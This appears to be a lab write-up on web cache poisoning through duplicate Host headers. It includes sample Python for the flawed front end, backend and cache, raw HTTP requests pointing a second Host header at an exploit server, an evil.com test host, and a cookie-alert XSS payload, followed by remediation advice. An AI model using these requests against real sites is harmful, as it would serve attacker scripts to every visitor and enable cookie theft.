# Web Cache Poisoning via Ambiguous Requests

**Severity:** High<br>
**Class:** Host Header Injection -> Web Cache Poisoning / Stored XSS

## Vulnerability Overview

The application is vulnerable to Host header ambiguity: when a request
contains duplicate `Host` headers, the front-end router validates the
request using the **first** `Host` header, while a separate backend
component builds absolute URLs for imported static resources (e.g a
JavaScript tracking script) using the **second**, duplicate `Host` header.

Critically, the front-end cache keys stored responses **only by the
request path**, without including the `Host` header value at all
("unkeyed input"). This means an attacker can send a single request with
a malicious secondary `Host` header pointing to an XSS payload, and the
resulting poisoned response is cached under the same key that legitimate,
unmodified requests to that path will also match — causing every
subsequent visitor to receive the attacker's injected script instead of
the real one.

The vulnerable application loads JavaScript resources using the format
`{host}/resources/js/tracking.js`. If the backend does not correctly
handle duplicate `Host` headers, it may look something like this:

```python
# --- Front-end router: validates using the FIRST Host header ---
def validate_host(raw_headers):
    # raw_headers preserves the header list in order, including duplicates
    first_host = next(v for k, v in raw_headers if k.lower() == "host")
    if first_host not in ALLOWED_HOSTS:
        raise_400_bad_request()
    # request passes validation here, unaware a second Host exists


# --- Backend: headers get parsed into a dict, duplicate keys get overwritten ---
def parse_headers(raw_headers):
    headers = {}
    for name, value in raw_headers:
        headers[name.lower()] = value  # last occurrence wins
    return headers

def render_homepage(request):
    headers = parse_headers(request.raw_headers)
    host = headers["host"]  # <-- this is actually the SECOND Host header
    return f'<script src="//{host}/resources/js/tracking.js"></script>'


# --- Cache layer: keys the response ONLY by path, ignoring Host entirely ---
cache = {}

def get_response(request):
    cache_key = request.path  # Host is never part of the key ("unkeyed input")
    if cache_key in cache and not is_expired(cache[cache_key]):
        return cache[cache_key]          # served to EVERY visitor, unmodified
    response = render_homepage(request)
    cache[cache_key] = response
    return response
```

If we know the exact path of the file that the server loads, we can
create a JS payload script on our controlled server. The query will be
as follows:

```http
GET / HTTP/2
Host: ID.web-security-academy.net
Host: exploit-ID.exploit-server.net
Cookie: session=; _lab=...
```

If this works, the server will load the JavaScript code from our server
into the cache, which will be served to all subsequent visitors:
`exploit-ID.exploit-server.net/resources/js/tracking.js`

## Steps to Reproduce

**1. Intercept the request**

Intercept the request using Burp Suite and inspect the HTTP headers. The
server loads a JavaScript file from the following path:
`/resources/js/tracking.js`.

<img width="1263" height="175" alt="Requests" src="https://github.com/user-attachments/assets/2a66ebcb-0960-4256-b91d-29a572dda86f" />

**2. Confirm the ambiguous Host behavior**

Send a PoC request to `/` with a duplicate `Host` header to observe the
server's behavior.

<img width="1217" height="693" alt="Double-Host-Poc" src="https://github.com/user-attachments/assets/244996d2-58c4-4954-ace0-b625500c4fb7" />

The server responds with `200 OK` and actually attempted to load the
script from `evil.com/resources/js/tracking.js`, visible in the
response — confirming the vulnerability.

**3. Create the payload**

Go to the exploit server and create a payload for stealing cookies
(`alert(document.cookie)`).

<img width="1223" height="904" alt="Create-A-Payload" src="https://github.com/user-attachments/assets/b7ab3105-9966-494c-9c34-1a6a6c8b999b" />

**4. Confirm exploitation with a cache buster**

Replace `evil.com` with the exploit server domain so the request
becomes:

```http
GET / HTTP/2
Host: ID.web-security-academy.net
Host: exploit-ID.exploit-server.net
Cookie: session=; _lab=...
```

A cache buster is added for testing.

<img width="1215" height="691" alt="Double-Host-With-Exploit-Server" src="https://github.com/user-attachments/assets/1aecb657-fb84-4e2a-9e24-8b22a180e802" />

Visiting `ID.web-security-academy.net/?cb=2` triggers the alert.

<img width="494" height="92" alt="Alert" src="https://github.com/user-attachments/assets/b8eee491-388a-451b-98f1-ddf7254c0b81" />

**5. Poison the main page**

Repeat the same request against `/` without a cache buster, so the
poisoned response is cached under the same key legitimate visitors will hit.

<img width="1220" height="701" alt="Main-Page-Poisned" src="https://github.com/user-attachments/assets/774b23b0-219f-4aca-9db5-879d53b0c6d7" />

**6. Confirm impact on other visitors**

Visiting `ID.web-security-academy.net` now triggers the alert for any
visitor — lab solved.

<img width="733" height="185" alt="Solved-Lab" src="https://github.com/user-attachments/assets/1a159c27-4649-42e5-8d41-c259d152c6c7" />

## Root Cause

The vulnerability stems from three independent design decisions that,
combined, produce an exploitable flaw:

- The front-end router validates the request using the **first** `Host`
  header it encounters.
- The backend code that builds absolute resource URLs parses headers
  into a dictionary, where a duplicate `Host` key gets overwritten — so
  it ends up using the **second** `Host` header instead.
- The caching layer keys stored responses **only by request path**,
  never taking the `Host` header into account.

No single component is "wrong" in isolation — the vulnerability exists
purely because of the mismatch in what each component reads.

## Impact

- **Stored/persistent XSS affecting every visitor** to the poisoned
  page, not just the attacker who triggered it — significantly higher
  severity than a typical reflected XSS.
- Since the payload executes under the real domain's origin, it can be
  used to steal session cookies, perform actions on behalf of victims,
  or serve further malicious content.
- Because the flaw lives in a shared cache, a single malicious request
  can compromise many users until the cache entry expires or is
  manually purged.

## Remediation

- **Include `Host` in the cache key**, or better, avoid using
  client-supplied `Host` at all when generating cached, publicly-served
  content.
- **Reject requests containing duplicate `Host` headers** outright
  (`400 Bad Request`) rather than silently picking one.
- Hardcode the canonical domain server-side for building absolute URLs,
  rather than deriving it from any client-supplied header.
